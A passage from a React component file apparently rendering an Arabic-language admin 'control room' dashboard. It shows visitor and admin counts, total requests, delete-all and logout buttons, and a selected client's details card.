                <i className="fas fa-arrow-right"></i> القائمة
              </button>
            )}
            {isNarrow && !mobileShowList && selectedUser && (
              <div
                className="mobile-top-user"
                title={
                  selectedUser.name || selectedUser.carHolderName || "مجهول"
                }
              >
                <span className="mobile-top-user__name">
                  {selectedUser.name || selectedUser.carHolderName || "مجهول"}
                </span>
                {selectedUnread ? (
                  <FaBell
                    className="mobile-top-user__bell"
                    title="بيانات جديدة"
                    aria-label="بيانات جديدة"
                  />
                ) : null}
              </div>
            )}
            <span className="page-title__text">
              <i className="fas fa-terminal"></i> غرفة التحكم المركزية
            </span>
          </div>
          <div className="top-actions">
            <div className="stats-pill stats-pill--visitors">
              <span className="pulse-dot pulse-dot--inline"></span>
              زوار: {onlineCounts.visitors}
            </div>
            <div className="stats-pill stats-pill--admins">
              أدمن: {onlineCounts.dashboard}
            </div>
            <div className="stats-pill">إجمالي الطلبات: {Users.length}</div>
            <button className="btn-action btn-del-all" onClick={deleteAllUsers}>
              <i className="fas fa-trash-alt"></i> حذف جميع العملاء
            </button>
            <button className="btn-action btn-out" onClick={handleLogOut}>
              <i className="fas fa-sign-out-alt"></i> تسجيل خروج
            </button>
          </div>
        </header>

        <div
          className="grid-container grid-container--single"
          id="clients-container"
        >
          {!selectedUser ? (
            <div className="main-empty-state">
              <p>اختر عميلاً من القائمة لعرض التفاصيل.</p>
            </div>
          ) : (
            renderClientCard(selectedUser)
          )}
        </div>
      </main>
    </div>
  );
};

export default Main_Page;
